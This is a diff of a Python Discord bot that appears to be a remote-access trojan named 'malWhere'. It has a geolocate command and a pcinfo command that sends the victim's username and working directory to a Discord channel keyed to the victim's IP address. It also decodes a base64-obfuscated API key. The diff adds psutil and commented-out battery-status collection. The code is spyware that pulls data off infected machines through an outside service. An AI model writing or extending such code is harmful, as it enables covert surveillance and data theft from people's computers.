@@ -7,8 +7,9 @@ import json
 import base64
 #import pyautogui
 import getpass
+import psutil
 
-encryptedapi="<base64 encoded api key>="
+encryptedapi="<base64 encoded api key>"
 base64_string =encryptedapi
 base64_bytes = base64_string.encode("ascii")
 sample_string_bytes = base64.b64decode(base64_bytes)
@@ -96,9 +97,14 @@ async def geolocate(ctx):
 @malWhere.command()
 async def pcinfo(ctx):
   if str(ctx.channel)==(ip4chan):
+    #battery = psutil.sensors_battery()
+    #plugged = battery.power_plugged
+    #percent = str(battery.percent)
+    #plugged = "Plugged In" if plugged else "Not Plugged In"
     embed=discord.Embed(title="PCData", url="", description=f"{ip}'s PC data", color=0xFF5733)
     embed.add_field(name="Username", value=getpass.getuser(), inline=False)
     embed.add_field(name="Current Working Directory", value=os.getcwd(), inline=False)
+    #embed.add_field(name="battery status", value=f"Battery Percentage is {percent}% Batter Plugged in =  {plugged}")
     await ctx.send(embed=embed)
   await ctx.channel.send("wrong channel skid")
 
